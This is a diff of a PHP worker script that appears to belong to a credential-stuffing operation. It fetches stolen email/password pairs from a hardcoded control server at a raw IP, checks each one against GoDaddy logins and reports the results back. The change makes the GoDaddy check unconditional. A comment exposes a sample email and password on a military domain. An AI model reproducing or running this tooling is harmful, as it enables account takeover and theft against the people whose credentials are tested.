@@ -1,4 +1,3 @@
-
 	$host = "http://158.69.193.39";
     $connect_url = "/w/api/v1/workers/connect.php";
     $nextmail_url = "/w/api/v1/mails/next.php";
@@ -120,34 +119,22 @@
 	if ($is_connected) {
 		echo $is_connected['desc'];
 		// get mailpass
-		$nextmail_resp = nextMail($host.$nextmail_url."?secret=".$secret);
+		$nextmail_resp = nextMail($host.$nextmail_url."?secret=".$secret."&type=1");
 		// Array ( [status] => 1 [data] => Array ( [id] => 87482 [mail] => john.braun@socom.mil [pass] => raz.rv [types] => 1 ) )
 		
 		if($nextmail_resp['status']) {
 			$mailpass = $nextmail_resp['data'];
-			switch ($mailpass['types']) {
-				case 1:
-					$result = checkGodaddy($mailpass);
-					$query = array(	'id' => $mailpass['id'],
-									'mail' => $mailpass['mail'],
-									'pass' => $mailpass['pass'],
-									'type' => $mailpass['types'],
-									'result' => $result,
-									'data' => '');
-					
-					$new_result_url = $host.$newresult_url."?secret=".$secret;
-					newResult($new_result_url, $query);
-					echo "update success";
-					break;
-				case 2:
-					echo "i equals 1";
-					break;
-				case 3:
-					echo "i equals 2";
-					break;
-				default:
-					break;
-			}
+			$result = checkGodaddy($mailpass);
+			$query = array(	'id' => $mailpass['id'],
+							'mail' => $mailpass['mail'],
+							'pass' => $mailpass['pass'],
+							'type' => $mailpass['types'],
+							'result' => $result,
+							'data' => '');
+			
+			$new_result_url = $host.$newresult_url."?secret=".$secret;
+			newResult($new_result_url, $query);
+			echo "update success";
 		}
 	
 	}
